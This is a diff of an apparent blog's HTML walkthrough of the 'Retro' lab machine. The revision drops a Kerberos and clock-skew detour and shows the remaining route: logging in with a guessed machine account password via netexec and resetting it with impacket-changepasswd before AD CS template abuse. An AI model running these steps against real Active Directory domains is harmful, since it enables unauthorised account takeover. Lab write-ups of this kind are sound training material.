@@ -17,10 +17,9 @@
 <meta property="og:image" content="https://panosoikogr.github.io/images/Retro/lookupsid.png">
 <meta property="og:image" content="https://panosoikogr.github.io/images/Retro/trainee-smb.png">
 <meta property="og:image" content="https://panosoikogr.github.io/images/Retro/mchine-accounts.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Retro/using-kerberos.png">
 <meta property="og:image" content="https://panosoikogr.github.io/images/Retro/ESC01-Certipy.png">
 <meta property="article:published_time" content="2025-03-10T22:44:15.000Z">
-<meta property="article:modified_time" content="2025-03-10T22:49:04.428Z">
+<meta property="article:modified_time" content="2025-03-15T18:55:52.418Z">
 <meta property="article:author" content="Panosoiko">
 <meta property="article:tag" content="VL">
 <meta name="twitter:card" content="summary">
@@ -210,12 +209,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:Computer) RETURN n</span><br></pre></td></tr></table></figure>
 <p><img src="/images/Retro/mchine-accounts.png" alt="mchine-accounts"><br>We will try to use the machine account name <code>Banking$</code> with the password <code>banking</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.98.48 -u &#x27;Banking$&#x27; -p banking</span><br></pre></td></tr></table></figure>
-<p>The error that we get is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> so we will try and use kerberos auth.(we need to fix the clock skew first)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-ntp off</span><br><span class="line">sudo rdate -n 10.10.98.48</span><br></pre></td></tr></table></figure>
-<p>Finally now we can authenticate with the machine account using kerberos</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.98.48 -u &#x27;Banking$&#x27; -p &#x27;banking&#x27; --kerberos --shares</span><br></pre></td></tr></table></figure>
-<p><img src="/images/Retro/using-kerberos.png" alt="using-kerberos"></p>
-<p>Now we will be changing the password of the machine account so we can use it without using kerberos auth</p>
+<p>The error that we get is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> this can be fixed by changing password for the machine account.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro.vl/BANKING$&#x27;:banking@10.10.98.48 -newpass StrongP@ss1234 -dc-ip 10.10.98.48 -p rpc-samr</span><br></pre></td></tr></table></figure>
 
 <h3 id="AD-CS"><a href="#AD-CS" class="headerlink" title="AD CS"></a>AD CS</h3><p>Running certipy to find any templates that may be vulnurable:</p>
